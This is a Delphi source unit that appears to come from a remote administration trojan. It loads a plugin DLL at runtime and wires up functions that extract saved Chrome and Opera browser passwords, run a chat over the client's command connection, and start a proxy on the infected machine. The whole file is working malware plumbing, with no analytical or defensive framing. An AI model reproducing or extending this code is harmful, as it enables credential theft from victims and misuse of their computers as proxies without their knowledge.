unit UnitPluginManager;

interface

uses
  Windows, SocketUnit, UnitVariables;

procedure LoadPlugin;
procedure UnloadPlugin;
function ListPasswords: string;
procedure LoadSqlite3;
procedure StartChat; stdcall;
procedure StopChat;
procedure WriteMessage(TmpMsg: string);
function StartProxy(Port: Word; Mutex: string): Boolean;

implementation

var
  PluginHandle: THandle;
  _StartChat: procedure(ClientSocket: TClientSocket; Nickname: string); stdcall;
  _StopChat: procedure; stdcall;
  _WriteMessage: procedure(TmpMsg: PChar); stdcall;
  ChromePasswords: function(Sqlite3file: PChar): PChar; stdcall;
  OperaPasswords: function(Sqlite3file: PChar): PChar; stdcall;
  _LoadSqlite3: procedure(Sqlite3file: PChar); stdcall;
  _StartProxy: function(Port: Word; Mutex: PChar): Boolean; stdcall;

procedure LoadPlugin;
begin
  PluginHandle := LoadLibrary(PChar(Pluginfile));
  @_StartChat := GetProcAddress(PluginHandle, 'StartChat');
  @_StopChat := GetProcAddress(PluginHandle, 'StopChat');
	@_WriteMessage := GetProcAddress(PluginHandle, 'WriteMessage');
  @ChromePasswords := GetProcAddress(PluginHandle, 'ChromePasswords');
  @OperaPasswords := GetProcAddress(PluginHandle, 'OperaPasswords');
  @_LoadSqlite3 := GetProcAddress(PluginHandle, 'LoadSqlite3');
  @_StartProxy := GetProcAddress(PluginHandle, 'StartProxy');
end;
    
procedure UnloadPlugin;
begin
  FreeLibrary(PluginHandle);
end;
 
procedure StartChat; stdcall;
begin
  if Assigned(_StartChat) then
  _StartChat(MainConnection, Nickname);
end;

procedure StopChat;
begin
  if Assigned(_StopChat) then _StopChat;
end;

procedure WriteMessage(TmpMsg: string);
begin
  if Assigned(_WriteMessage) then _WriteMessage(PChar(TmpMsg));
end;

function ListPasswords: string;
begin
  if (Assigned(ChromePasswords)) and (Assigned(OperaPasswords)) then
  Result := ChromePasswords(PChar(Sqlite3file)) + '_' + OperaPasswords(PChar(Sqlite3file));
end;

procedure LoadSqlite3;
begin
  if Assigned(_LoadSqlite3) then _LoadSqlite3(PChar(Sqlite3file));
end;

function StartProxy(Port: Word; Mutex: string): Boolean;
begin
  if Assigned(_StartProxy) then
  Result := _StartProxy(Port, PChar(Mutex));
end;

end.
